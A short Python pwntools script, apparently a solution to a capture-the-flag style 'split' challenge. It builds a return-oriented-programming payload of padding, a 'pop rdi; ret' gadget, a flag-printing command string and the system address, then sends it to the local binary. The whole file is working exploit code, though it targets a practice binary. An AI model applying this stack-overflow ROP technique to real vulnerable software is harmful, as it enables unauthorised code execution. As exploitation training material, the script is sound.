import pwn

cat_flag = 0x00601060
binary = pwn.ELF("split")
system = binary.symbols[b'system']
# 0x0000000000400883: pop rdi; ret;

payload = b''
payload += ("D"*32).encode()
payload += ("B"*8).encode()
payload += pwn.p64(0x0000000000400883)
payload += pwn.p64(cat_flag)
payload += pwn.p64(system)
payload += "\n".encode()

with open("input.txt", "wb") as f:
    f.write(payload)


p = pwn.tubes.process.process(["./split"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()

